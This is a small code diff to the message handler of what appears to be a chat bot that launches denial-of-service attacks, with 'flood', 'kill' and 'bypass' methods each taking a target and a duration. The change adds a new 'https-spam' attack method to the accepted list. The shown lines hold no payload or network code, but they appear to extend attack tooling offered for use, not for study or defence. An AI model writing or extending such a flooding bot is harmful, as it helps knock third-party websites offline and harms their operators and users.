@@ -41,7 +41,7 @@ bot.on('message', async (msg) => {
     let target = '';
     let time = 0;
 
-    if (['flood', 'kill', 'bypass'].includes(args[0])) {
+    if (['flood', 'kill', 'bypass', 'https-spam'].includes(args[0])) {
       method = args[0];
       target = args[1];
       time = parseInt(args[2]);
